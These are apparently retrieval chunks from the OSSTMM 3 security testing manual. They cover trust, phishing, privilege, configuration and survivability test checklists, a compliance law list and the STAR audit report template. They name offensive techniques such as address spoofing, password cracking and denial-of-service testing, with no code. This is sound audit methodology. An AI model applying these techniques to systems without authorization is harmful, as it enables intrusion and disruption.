Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 173\\n11.6 Trust Verification Tests for trusts between systems within the scope where trust refers to access to information or physical property without the need for identification or authentication. 11.6.1 Spoofing (a) Test measures to access property within the scope by spoofing your network address as one of the trusted hosts. (b) Verify if available caching mechanisms can be poisoned. 11.6.2 Phishing (a) Verify that URLs for submissions and queries on the target are concise, within the same domain, use only the POST method, and use consistent branding. (b) Verify that target content images/records/data do not exist on sites outside of the target to create a duplicate of the target. (c) Examine top level domain records for domains similar to those identified within the scope. (d) Verify that the target uses personalization in websites and mail when interacting with authenticated users. (e) Verify the control and response of the target to mail bounces where the FROM is spoofed in the header field to be that of the target domain. 11.6.3 Resource Abuse (a) Test the depth",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 120
    }
  },
  {
    "text": "Verify that the target uses personalization in websites and mail when interacting with authenticated users. (e) Verify the control and response of the target to mail bounces where the FROM is spoofed in the header field to be that of the target domain. 11.6.3 Resource Abuse (a) Test the depth of access to business or confidential information available on web servers without any established, required credentials. (b) Test if information is sent to the outside of the scope as padding to network packets such as that which has occurred previously as “Etherleak”. (c) Verify that continuity measures, specifically load balancing, are seamless outside the scope to prevent users from using, referring, linking, bookmarking, or abusing just one of the resources. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 174\\n11.7 Controls Verification Tests to enumerate and verify the operational functionality of safety measures for assets and services. 11.7.1 Non-repudiation (a) Enumerate and test for use or inadequacies of daemons and systems to properly identify and log access or interactions to property for specific evidence to challenge repudiation. (b) Document the depth of the recorded interaction and the process of identification. (c) Verify that all methods of interactions are properly recorded with proper identification. (d) Identify methods of identification which defeat repudiation. 11.7.2 Confidentiality (a) Enumerate all interactions with services within the scope for communications or assets transported over the channel using secured lines, encryption, “quieted” or “closed” interactions to protect the confidentiality of the information property between the involved parties. (b) Verify the acceptable methods used for confidentiality. (c) Test the strength and design of the encryption or obfuscation method. (d) Verify the outer limits of communication which can be protected via the applied methods of confidentiality. 11.7.3 Privacy (a) Enumerate services within the scope for communications or assets transported using specific, individual signatures, personal identification, “quieted” or “closed room” personal interactions to protect the privacy of the interaction and the process of providing assets only to those within the proper security clearance for that process, communication, or asset. (b) Correlate information with non-responsive TCP and UDP ports to determine if availability is dependent upon a private type of contact or protocol. 11.7.4 Integrity Enumerate and test for inadequacies of integrity where using a documented process, signatures, encryption, hash, or markings to assure that the asset cannot be changed, redirected, or reversed without it being known to the parties involved. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 175\\n11.8 Process Verification Tests to examine the maintenance of functional security in established processes and due diligence as defined in the Posture Review. 11.8.1 Maintenance (a) Examine and document the timeliness, appropriateness, access to, and extent of processes for notification and security response in regards to network and security monitoring. (b) Verify the appropriateness and functionality of incident response and forensics capabilities for all types of systems. (c) Verify the level of incident or compromise which the support channels can detect and the length of response time. 11.8.2 Misinformation Determine the extent to",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 121
    }
  },
  {
    "text": "in regards to network and security monitoring. (b) Verify the appropriateness and functionality of incident response and forensics capabilities for all types of systems. (c) Verify the level of incident or compromise which the support channels can detect and the length of response time. 11.8.2 Misinformation Determine the extent to which security notifications and alarms can be expanded or altered with misinformation. 11.8.3 Due Diligence Map and verify any gaps between practice and requirements as determined in the Posture Review through all channels. 11.8.4 Indemnification (a) Document and enumerate targets and services which are protected from abuse or circumvention of employee policy, are insured for theft or damages, or use liability and permission disclaimers. (b) Verify the legality and appropriateness of the language in the disclaimers. (c) Verify the affect of the disclaimers upon security or safety measures. (d) Examine the language of the insurance policy for limitations on types of damages or assets. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 176\\n11.9 Configuration Verification Tests to gather all information, technical and non-technical, on how assets are intended to work, and to examine the ability to circumvent or disrupt functional security in assets, exploiting improper configuration of access controls, loss controls, and applications. 11.9.1 Configuration Controls (a) Examine controls to verify the configurations and baselines of systems, equipment and applications meet the intent of the organization and reflect a business justification. (b) Examine Access Control Lists (ACLs) and business roles configured on networks, systems, services, and applications within the scope to ensure they meet the intent of the organization and reflect a business justification. 11.9.2 Common Configuration Errors (a) Verify services available are not unnecessarily redundant and that they match the systems’ intended business role. (b) Verify default settings have been changed. Some devices or applications ship with a default or hidden administrative account. These accounts should be changed, or if possible, disabled or deleted and replaced with a new administrative account. (c) Verify that Administration is done locally or with controls to limit who or what can access the remote administration interfaces of the equipment. 11.9.3 Limitations Mapping (a) Check for unnecessary or unused services/features available. (b) Check for default credentials. (c) Identify if any known vulnerabilities are residing on the systems. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 177\\n11.10 Property Validation Tests to examine information and data available within the scope or provided by personnel which may be illegal or unethical. 11.10.1Sharing Verify the extent to which individually licensed, private, faked, reproduced, non-free, or non-open property is shared either intentionally through sharing processes and programs, libraries, and personal caches or unintentionally through mismanagement of licenses and resources, or negligence. 11.10.2Black Market Verify the extent to which individually licensed, private, faked, reproduced, non-free, or non-open property is promoted, marketed, or sold between personnel or by the organization. 11.10.3Sales Channels Verify whether any public, out of scope businesses, auctions, or property sales provide contact information from targets within the scope. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 178\\n11.11",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 122
    }
  },
  {
    "text": "licensed, private, faked, reproduced, non-free, or non-open property is promoted, marketed, or sold between personnel or by the organization. 11.10.3Sales Channels Verify whether any public, out of scope businesses, auctions, or property sales provide contact information from targets within the scope. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 178\\n11.11 Segregation Review Tests for appropriate separation of private or personal information property from business information. Like a privacy review, it is the focal point of the legal and ethical storage, transmission, and control of personnel, partner, and customer private information property. 11.11.1Privacy Containment Mapping Map key locations of private information property within the scope, what information is stored, how and where the information is stored, and over which channels the information is communicated. 11.11.2Disclosure (a) Examine and document types of disclosures of private information property for segregation according to policy and regulations as determined in the Posture Review. (b) Verify that private information and confidential intellectual property, such as documents, service contracts, OS/Software keys, etc. are not available to anyone without proper privileges. 11.11.3Limitations (a) Verify that design considerations or channel alternatives exist for people with physical limitations to interact with the target. (b) Identify any parts of the infrastructure designed to interact with children legally identified as minors and verify what and how identifying information is provided from that child. 11.11.4Discrimination Verify information requested and privileges granted from gatekeepers in cases where age (specifically minors), sex, race, custom/culture and religion are factors which may be discriminated against in accordance to the Posture Review. 11.12 Exposure Verification Tests for uncovering information which provides for or leads to access or allows for access to multiple locations with the same authentication. 11.12.1Exposure Enumeration (a) Enumerate information regarding the organization such as organization charts, key personnel titles, job descriptions, personal and work telephone numbers, mobile phone numbers, business cards, shared documents, resumes, organizational affiliations, private and public e-mail addresses, log-ins, log-in schemes, passwords, back-up methods, insurers, or any particular organizational information stated implicitly as confidential in regulations and policy. (b) Enumerate system, service and application exposures detailing the design, type, version, or state on the targets or from resources outside the scope such as from postings or leaks. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 179\\n11.13 Competitive Intelligence Scouting Tests for scavenging information that can be analyzed as business intelligence. While competitive intelligence as a field is related to marketing, the process here includes any form of competitive intelligence gathering, including but not limited to economic and industrial espionage. Business information includes but is not limited to business relationships like employees, partners, or resellers, contacts, finances, strategy, and plans. 11.13.1Business Grinding Enumerate and evaluate access points (gateways) to business property within the scope: what business information is stored, how it is stored, and where the information is stored. 11.13.2Profiling (a) Profile employee skill requirement types, pay scales, channel and gateway information, technologies, and organizational direction from sources outside the scope. (b) Profile data network set-ups and configurations from job databases and newspapers",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 123
    }
  },
  {
    "text": "scope: what business information is stored, how it is stored, and where the information is stored. 11.13.2Profiling (a) Profile employee skill requirement types, pay scales, channel and gateway information, technologies, and organizational direction from sources outside the scope. (b) Profile data network set-ups and configurations from job databases and newspapers hiring ads for data networking positions within the organization relating to hardware and software engineering or administration within the target’s default business language(s). 11.13.3Business Environment (a) Explore and document from individual gateway personnel business details such as alliances, partners, major customers, vendors, distributors, investors, business relations, production, development, product information, planning, stocks and trading, and any particular business information or property stated implicitly as confidential in regulations and policy. (b) Review third party web notes, annotations, and social bookmark site content made for the web presence of the scope. 11.13.4Organizational Environment Examine and document types of disclosures of business property from gatekeepers on operations, processes, hierarchy, financial reporting, investment opportunities, mergers, acquisitions, channel investments, channel maintenance, internal social politics, personnel dissatisfaction and turn-over rate, primary vacation times, hirings, firings, and any particular organizational property stated implicitly as confidential in regulations and policy. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 180\\n11.14 Quarantine Verification The containment measures dictate the handling of traversal, malicious programs and egress. The identification of the security mechanisms and the response policy need to be targeted. It may be necessary to request first a new test mail account or desktop system that the administrator can monitor. Tests for verifying the proper fielding and containment of aggressive or hostile contacts at the gateway points. 11.14.1Containment Process Identification Identify and examine quarantine methods for aggressive and hostile contacts such as malware, rogue access points, unauthorized storage devices, etc. 11.14.2Containment Levels (a) Measure the minimum resources that need to be available to this subsystem in order for it to perform its task. (b) Verify any resources available to this subsystem that it does not need to perform its tasks and what resources are shielded from use by this subsystem. (c) Verify the detection measures present for the detection of attempted access to the shielded resources. (d) Verify the features of the containment system. (e) Verify detection measures are present for detection of ’unusual’ access to the needed resources (f) Measure the response and process against encoded, packaged, condensed, renamed, or masqueraded inputs. (g) Verify the state of containment and length of time for quarantine methods both into and out of the scope. Ensure the completeness and thoroughness of the methods and that they are within legal context and boundaries. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 181\\n11.15 Privileges Audit Tests where credentials are supplied to the user and permission is granted for testing with those credentials. 11.15.1Identification Examine and document the authorization process for obtaining identification from users through both legitimate and fraudulent means on all channels. 11.15.2Authorization (a) Examine and verify any means for gaining fraudulent authorization to gain privileges similar to that of other personnel. (b) Enumerate",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 124
    }
  },
  {
    "text": "is granted for testing with those credentials. 11.15.1Identification Examine and document the authorization process for obtaining identification from users through both legitimate and fraudulent means on all channels. 11.15.2Authorization (a) Examine and verify any means for gaining fraudulent authorization to gain privileges similar to that of other personnel. (b) Enumerate the use of default accounts on targets. (c) Test access to authenticated access points through the most appropriate and available cracking techniques. Password cracking via dictionary or brute-force may be limited by the time frame of the audit and therefore not a valid test of the protection from that authentication schema however any successful discoveries do attest to its weakness. 11.15.3 Escalation (a) Collect information on persons with high privileges. Look for trusted roles or positions, access gateways for trusted persons, and any required physical access media such as tokens or smart cards. (b) Verify the boundaries of privileges on the target or across multiple targets and if the means exists to escalate those privileges. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 182\\n11.16 Survivability Validation Determining and measuring the resilience of the targets within the scope to excessive or hostile changes designed to cause failure or degradation of service. Denial of Service (DoS) is a situation where a circumstance, either intentionally or accidentally, prevents the system from functioning as intended. In certain cases, the system may be functioning exactly as designed however it was never intended to handle the load, scope, or parameters being imposed upon it. Survivability tests must be closely monitored as the intent is to cause failure and this may be unacceptable to the target’s owner. 11.16.1Resilience (a) Verify single points of failure (choke points) in the infrastructure where change or failure can cause a service outage. (b) Verify the impact to target access which a system or service failure will cause. (c) Verify the privileges available from the failure-induced access. (d) Verify the operational functionality of controls to prevent access or permissions above lowest possible privileges upon failure. 11.16.2Continuity (a) Enumerate and test for inadequacies from all targets with regard to access delays and service response times through back-up systems or the switch to alternate channels. (b) Verify intruder lock-out schemes cannot be used against valid users. 11.16.3Safety Map and document the process of gatekeepers shutting down target systems due to evacuation or safety concerns as a gap analysis with regulation and security policy. 11.17 Alert and Log Review A gap analysis between activities performed with the test and the true depth of those activities as recorded or from third-party perceptions both human and mechanical. 11.17.1 Alarm Verify and enumerate the use of a localized or scope-wide warning system, log, or message for each access gateway over each channel where a suspect situation is noted by personnel upon suspicion of circumvention attempts, social engineering, or fraudulent activity. 11.17.2 Storage and Retrieval (a) Document and verify unprivileged access to alarm, log, and notification storage locations and property. (b) Verify the quality and the length of time",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 125
    }
  },
  {
    "text": "gateway over each channel where a suspect situation is noted by personnel upon suspicion of circumvention attempts, social engineering, or fraudulent activity. 11.17.2 Storage and Retrieval (a) Document and verify unprivileged access to alarm, log, and notification storage locations and property. (b) Verify the quality and the length of time of the document storage to assure the data will maintain integrity on that storage medium for the required duration. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 183\\nCompliance requirements which enforce protection measures as a surrogate for responsibility are also a substitute for accountability. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 184\\nChapter 12 - Compliance Compliance is alignment with a set of general policies, where the type of compliance required depends upon the region and currently ruling government, industry and business types, and supporting legislation. Compliance is compulsory; however, as with any other threat, a risk assessment must be made whether or not to invest in any type of compliance. Often, compliance is not as black and white as it appears to be. The OSSTMM recognizes three types of compliance: 1. Legislative. Compliance with legislation is in accordance to the region where the legislation can be enforced. The strength and commitment to the legislation comes from previously successful legal arguments and appropriately set and just enforcement measures. Failure to comply with legislation may lead to criminal charges. Examples are Sarbanes-Oxley, HIPAA, and the various Data Protection and Privacy legislation. 2. Contractual. Compliance to contractual requirements are in accordance to the industry or within the group that requires the contract and may take action to enforce compliance. Failure to comply with contractual requirements often leads to dismissal from the group, a loss of privileges, loss of reputation, civil charges, and in some cases where legislation exists to support the regulatory body, criminal charges. An example is the payment card industry data security standard (PCI DSS) promoted and required by VISA and MasterCard. 3. Standards based. Compliance to standards is in accordance with the business or organization where the compliance to standards is enforced as policy. Failure to comply with standards often leads to dismissal from the organization, a loss of privileges, a loss of reputation or brand trust, civil charges, and in some cases where legislation exists to support the policy makers, criminal charges. Examples are the OSSTMM, ISO 27001/5, and ITIL. The OSSTMM is developed with concern for major legislation, contractual requirements, and standards conformance. As not all compliance objectives are created equally, the main focus of the OSSTMM is security. Compliance measures that require specific products or services, commercial or otherwise, often through specially lobbied efforts, may have good intentions; however, may actually be a waste of resources or a lesser version of security than is desired. That a compliance objective can require a specific product at all should be illegal itself. As legislation and regulation may be audited either under the letter of the law or the spirit of the law, depending upon the auditing body, proving",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 126
    }
  },
  {
    "text": "or a lesser version of security than is desired. That a compliance objective can require a specific product at all should be illegal itself. As legislation and regulation may be audited either under the letter of the law or the spirit of the law, depending upon the auditing body, proving proper and valid operational protection and controls such that as can be proved by an OSSTMM test may or may not be satisfactory. Therefore, in addition a certified OSSTMM test complete with the STAR should also be presented to the appropriate auditing bodies. The following list is only for compliance which has been verified with the OSSTMM and does not limit the actual scope of regulatory and legislative bodies for which this standard may apply. If you are able to verify compliance measures not listed here according to the OSSTMM or need a specific compliance measure verified please send it to ISECOM for inclusion in this list. The compliance measure must be in English or sent to an ISECOM partner which exists within a region with that local language. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 185\\nRegulations Australia  Privacy Act Amendments of Australia-- Act No. 119 of 1988 as amended, prepared on 2 August 2001 incorporating amendments up to Act No. 55 of 2001. The Privacy Act 1988 (the Privacy Act) seeks to balance individual privacy with the public interest in law enforcement and regulatory objectives of government.  National Privacy Principle (NPP) 6 provides an individual with a right of access to information held about them by an organization.  National Privacy Principle (NPP) 4.1 provides that an organization must take reasonable steps to protect the personal information it holds from misuse and loss and from unauthorized access, modification or disclosure.  Commonwealth Privacy Act.  Australian Communications Authority - http://www.aca.gov.au/  Australian Radiation Protection and Nuclear Safety Agency http://www.arpansa.gov.au/mph2.htm Austria  Austrian Data Protection Act 2000 (Bundesgesetz über den Schutz personenbezogener Daten (Datenschutzgesetz 2000 - DSG 2000)), specifically the requirements of §14. Belgium  Belgisch Staatsblad N. 189, June 2005 Canada  Privacy Act, 1983.  Municipal Freedom of Information and Protection of Privacy Act (MFIPPA), 1991.  Quebec’s Act Respecting the Protection of Personal Information in the Private Sector, 1993.  Personal Information Protection and Electronic Documents Act (PIPEDA), 2000.  Ontario’s Bill 198, 2002.  Personal Information Protection Act (PIPA), provinces of Alberta and British Columbia, 2004.  Personal Health Information Protection Act (PHIPA), 2004.  Royal Society of Canada - http://www.rsc.ca/ Estonia  Minister of Economic Affairs and Communications Information Security Policy France  Société Française de Radioprotection - http://www.sfrp.asso.fr/ Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 186\\nGermany  Deutsche Bundesdatenschutzgesetz (BDSG)-- Artikel 1 des Gesetzes zur Fortentwicklung der Datenverarbeitung und des Datenschutzes from 20. December 1990, BGBl. I S. 2954, 2955, zuletzt geändert durch das Gesetz zur Neuordnung des Postwesens und der Telekommunikation vom 14. September 1994, BGBl. I S. 2325.  IT Baseline Protection Manual (IT-Grundschutz Catalogues) Issued by Bundesamt",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 127
    }
  },
  {
    "text": "Artikel 1 des Gesetzes zur Fortentwicklung der Datenverarbeitung und des Datenschutzes from 20. December 1990, BGBl. I S. 2954, 2955, zuletzt geändert durch das Gesetz zur Neuordnung des Postwesens und der Telekommunikation vom 14. September 1994, BGBl. I S. 2325.  IT Baseline Protection Manual (IT-Grundschutz Catalogues) Issued by Bundesamt für Sicherheit in der Informationstechnik (Federal Office for Information Security (BSI)) available at http://www.bsi.de/gshb/english/menue.htm.  German IT Systems. S6.68 (Testing the effectiveness of the management system for the handling of security incidents) and tests S6.67 (Use of detection measures for security incidents).  Bundesamt für Strahlenschutz - http://www.bfs.de/ India  The Information Technology Act, 2000. Italy  D.Lgs. n. 196/2003 - Codice in materia di protezione dei dati personali. Where in a Contract/Agreement the Client, owner of the treatment of the data, must assume any law responsibility as a sensitive data as medical, personal, judicial of Employees or Customers but even Dealers and Partners. A tester must be willing to accept all the consequent responsibility when accepting the Non Disclosure Agreement especially about the derived risk from the possible knowledge of sensitive data and the clause of reservation to the time limit of this special care which could be indefinite. Malaysia  Computer Fraud and Abuse Act.  The Computer Crimes Act. Mexico  Ley Federal de Transparencia y Acceso a la Información Pública Gubernamental.  Ley de Propiedad Industrial (LPI).  Ley Federal de Derechos de Autor (LFDA) and its rules book (RLFDA).  Código Penal Federal y Código Federal de Procedimientos Penales. Netherlands  Dutch Computer Crime Act II of September 1, 2006 changing the Dutch Computer Crime Act of 1993  Council of Europe’s Cybercrime Convention (CCC), 23 November 2001  The ratification of Treaty \"Convention on Cybercrime, Budapest, 23.XI.2001\" effective June 1, 2006 Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 187\\nSingapore  Computer Misuse Act.  E-Commerce Code for Protection of Personal Information and Communications of Consumers of Internet Commerce. Spain  Spanish LOPD Ley Organica de Protección de Datos de Carácter Personal.  LSSICE 31/2002 (Ley de Servicios de la Sociedad de la Información y el Correo Electronico), July 11, 2002.  RD 14/1999 (Real Decreto de Regulación de la Firma Electrónica), September 17, 1999.  Real Decreto 1720/2007, de 21 de diciembre, por el que se aprueba el Reglamento de desarrollo de la Ley Orgánica 15/1999, de 13 de diciembre, de protección de datos de carácter personal. Switzerland  Bundesverfassung (BV) vom 18. Dezember 1998, Artikel 7 und 13.  Obligationenrecht (OR) 2002 (Stand am 1. Oktober 2002), Artikel 707, 716, 716b, 717, 727ff und 321a.  Datenschutzgesetz (DSG) vom 19. Juni 1992 (Stand am 3. Oktober 2000).  Bundesamt für Kommunikation (BAKOM)  Bundesamt für Umwelt Thailand  Computer Crime Law.  Privacy Data Protection Law. United Kingdom  UK Data Protection Act 1998.  Freedom of Information Act 2000  Human Rights Act 2000  Regulation of Investigatory Powers Act 2000  Access to Health Records Act 1990  Proceeds of",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 128
    }
  },
  {
    "text": " Bundesamt für Umwelt Thailand  Computer Crime Law.  Privacy Data Protection Law. United Kingdom  UK Data Protection Act 1998.  Freedom of Information Act 2000  Human Rights Act 2000  Regulation of Investigatory Powers Act 2000  Access to Health Records Act 1990  Proceeds of Crime Act 2002  Money Laundering Regulations 2003  Electronics Communications Act 2000  Electronics Signature Regulations 2002  Privacy and Electronic Communications (EC Directive) Regulations 2003  Electronic Commerce (EC Directive) Regulations 2003  Companies (Audit, Investigations and Community Enterprise) bill  IT Information Library available at http://www.ogc.gov.uk/index.asp?id=2261 issued by the British Office for Government Commerce (OGC).  BSI ISO 17799-2000 (BS 7799) - this manual fully complies with all of the remote auditing and testing requirements of BS7799 (and its International equivalent ISO 17799) for information security auditing.  UK CESG CHECK - specifically the CESG IT Health CHECK service. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 188\\nUnited States of America  AICPA SAS 70 - verification of process control activities are applicable to the Service Auditor’s Report in the Statement on Auditing Standards (SAS) No. 70 from the American Institute of Certified Public Accountants guidance for Internal Auditors.  Clinger-Cohen Act.  Government Performance and Results Act.  FTC Act, 15 U.S.C. 45(a), Section 5(a).  Children’s Online Privacy Protection Act (COPPA).  Anticybersquatting Protection Act (ACPA).  Federal Information Security Management Act.  U.S. Sarbanes-Oxley Act (SOX).  California Individual Privacy Senate Bill – SB1386.  USA Government Information Security Reform Act of 2000 section 3534(a)(1)(A).  MITRE Common Vulnerabilities and Exposures - the rav Security Limitations described within this manual comply to the CVE descriptions for more efficient categorizations (http://cve.mitre.org/about/terminology.html).  DoD FM 31-21, Guerrilla Warfare and Special Forces Operations.  Health Insurance Portability and Accountability Act of 1996 (HIPAA).  OCR HIPAA Privacy TA 164.502E.001, Business Associates [45 CFR §§ 160.103, 164.502(e), 164.514(e)].  OCR HIPAA Privacy TA 164.514E.001, Health-Related Communications and Marketing [45 CFR §§ 164.501, 164.514(e)].  OCR HIPAA Privacy TA 164.502B.001, Minimum Necessary [45 CFR §§ 164.502(b), 164.514(d)].  OCR HIPAA Privacy TA 164.501.002, Payment [45 CFR 164.501].  HIPAA Standards for Privacy of Individually Identifiable Health Information (45 CFR parts 160 and 164).  FDA: Computerized Systems used in Clinical Trails. Electronic Records; Electronic Signatures; [21 CFR Part 11].  U.S. Gramm-Leach-Bliley Act (GLBA).  Computer Security Act of 1987 (P.L. 100-235)  Office of Personnel Management (OPM) - Regulations Implementing Training Requirements of Computer Security Act of 1987 - 5 CFR Part 930, Subpart C  COSO section 7 Information & Communication  COBit section 3 Educate & Train Users  North American Electric Reliability Council (NERC) - Standard 1300 section 1303.a.1, 1303.a.2, 1303.a.3  U.S. Geological Survey Manual, 600.5 - Automated Information Systems Security - General Requirements, section 6 A  Department of Veterans Affairs - VA DIRECTIVE 6210 section 2(d)(3)Security Awareness & Training  Federal Information Security Management Act (FISMA) § 3544(a)(4), (b)(4)  Executive Directive",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 129
    }
  },
  {
    "text": "Standard 1300 section 1303.a.1, 1303.a.2, 1303.a.3  U.S. Geological Survey Manual, 600.5 - Automated Information Systems Security - General Requirements, section 6 A  Department of Veterans Affairs - VA DIRECTIVE 6210 section 2(d)(3)Security Awareness & Training  Federal Information Security Management Act (FISMA) § 3544(a)(4), (b)(4)  Executive Directive Appendix III to OMB Circular No. A-130  State of Virginia ITRM Standard 95-1 section VI  Food and Drug Administration - http://www.fda.gov  Federal Communications Commission - http://www.fcc.gov/ Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 189\\nNIST Publications  An Introduction to Computer Security: The NIST Handbook, 800-12.  Guidelines on Firewalls and Firewall Policy, 800-41.  Information Technology Security Training Requirements: A Role- and Performance-Based Model, 800-16.  Guideline on Network Security Testing, 800-42.  Security Self-Assessment Guide for Information Technology Systems.  PBX Vulnerability Analysis: Finding Holes in Your PBX Before Someone Else Does, 800-24.  Risk Management Guide for Information Technology Systems, 800-30.  Intrusion Detection Systems, 800-31.  Building an Information Technology Security Awareness and Training Program, 800-50.  NIST Special Publication 800-53, Recommended Security Controls for Federal Information Systems.  Security Metrics Guide for Information Technology Systems, 800-55.  Guide for the Security Certification and Accreditation of Federal Information Systems, 800-37.  DRAFT: An Introductory Resource Guide for Implementing the Health Insurance Portability and Accountability Act (HIPAA) Security Rule, 800-66.  Federal Financial Institutions Examination Council (FFIEC): Electronic Operations, 12 CFR Part 555.  Interagency Guidelines Establishing Standards for Safeguarding Customer Information, 12 CFR 570 Appendix B.  Interagency Guidelines Establishing Standards for Safety and Soundness, 12 CFR 570, Appendix A.  Privacy of Consumer Financial Information, 12 CFR 573.  Procedures for Monitoring Bank Secrecy Act Compliance, 12 CFR 563.177.  Security Procedures Under the Bank Protection Act, 12 CFR 568.  Suspicious Activity Reports and Other Reports and Statements, 12 CFR 563.180. General  SAC - this manual is compliant in design to the The Institute of Internal Auditors (IIA) Systems Assurance and Control (SAC) model.  ITIL - this manual is applicable to the operational security controls review and processes inter- relations according to the IT Infrastructure Library (ITIL).  PCI-DSS 1.2 (Payment Card Industry - Data Security Standard)  ISO/IEC 27001:2005 (Information security management systems - Requirements )  ISO/IEC 27002:2005 (Code of Practice for Information Security Management)  ILO and IMO Code of Practice – Security in Ports, Section 10  Basel II (International) Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 190\\nSecurity awareness should be the continuing practice of a skill and not the continuous reminder of a threat. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 191\\nChapter 13 – Reporting with the STAR The STAR is the Security Test Audit Report. Its purpose is to serve as an executive summary of precise calculation stating the Attack Surface of the targets tested within a particular scope. This precision is made through the requirement of specifically noting what was NOT tested in addition to what has been tested in",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 130
    }
  },
  {
    "text": "Security Test Audit Report. Its purpose is to serve as an executive summary of precise calculation stating the Attack Surface of the targets tested within a particular scope. This precision is made through the requirement of specifically noting what was NOT tested in addition to what has been tested in accordance to the OSSTMM. The provided template is to be filled out completely (a copy of this template by itself can be found at the ISECOM website) and signed by the Analyst. It is then provided either to ISECOM with the scope owner’s explicit permission or directly to the scope owner along with the full security test report. It is not a substitute for a full report. When providing the STAR to ISECOM for verification, it is printed, signed by the verification auditor, and stamped by ISECOM. A certificate is provided for all tests which state the scope has been tested and verified. There is no passing or failing since there is no particular Attack Surface rav value that exists for all scopes as the cut-off between one that passes and one that fails. However, rav values for a scope above 90% will be marked by a stamp of excellence. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 192\\nSecurity Test Audit Report OSSTMM 3.0 Security Verification Certification OSSTMM.ORG - ISECOM.ORG Report ID Date Lead Auditor Test Date Duration Scope and Index Vectors Channels Test Type I am responsible for the information within this report and have personally verified that all information herein is factual and true. SIGNATURE COMPANY STAMP/SEAL ISECOM Certification # ISECOM Certification # OPERATIONAL SECURITY VALUES CONTROLS VALUES Visibility Authentication Access Indemnification Trust Resilience Subjugation LIMITATIONS VALUES Continuity Vulnerability Non-Repudiation Weakness Confidentiality Concern Privacy Exposure Integrity Anomaly Alarm OpSec True Controls Limitations Security Δ True Protection Actual Security\\nPage 1 of 9 OVERVIEW This Open Source Security Testing Methodology Manual provides a methodology for a thorough security test. A security test is an accurate measurement of security at an operational level, void of assumptions and anecdotal evidence. A proper methodology makes for a valid security measurement that is consistent and repeatable. ABOUT ISECOM ISECOM, the creator and maintainer of the OSSTMM, is an independent, non-profit security research organization and certification authority defined by the principles of open collaboration and transparency. RELATED TERMS AND DEFINITIONS This report may refer to words and terms that may be construed with other intents or meanings. This is especially true within international translations. This report attempts to use standard terms and definitions as found in the OSSTMM 3 vocabulary, which has been based on NCSC-TG-004 (Teal Green Book) from the US Department of Defense where applicable. PURPOSE The primary purpose of this Audit Report is to provide a standard reporting scheme based on a scientific methodology for the accurate characterization of security through examination and correlation in a consistent and reliable way. The secondary purpose is to provide guidelines which when followed will allow the auditor to provide a certified OSSTMM audit. PROCESS This",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 131
    }
  },
  {
    "text": "is to provide a standard reporting scheme based on a scientific methodology for the accurate characterization of security through examination and correlation in a consistent and reliable way. The secondary purpose is to provide guidelines which when followed will allow the auditor to provide a certified OSSTMM audit. PROCESS This Audit Report must accompany the full security test report document that provides evidence of the test and the results as defined in the statement of work between the testing organization and the client. VALIDITY For this OSSTMM Audit Report to be valid, it must be filled out clearly, properly, and completely. The OSSTMM Audit Report must be signed by the lead or responsible tester or analyst and accompany include the stamp of the company which holds the contract or sub-contract of the test. This audit report must show under COMPLETION STATUS which Channel and the associated Modules and Tasks have been tested to completion, not tested to completion, and which tests were not applicable and why. A report which documents that only specific parts of the Channel test have been completed due to time constraints, project problems, or customer refusal may still be recognized as an official OSSTMM audit if accompanied by this report clearly showing the deficiencies and the reasons for those deficiencies. CERTIFICATION OSSTMM certification is the assurance of an organization’s security according to the thorough tests within the OSSTMM standard and is available per vector and channel for organizations or parts of organizations that maintain vigilance over their rav levels and have them validated yearly from an independent third-party auditor. Validation of security tests or quarterly metrics is subject to the ISECOM validation requirements to assure consistency and integrity.\\nPage 2 of 9 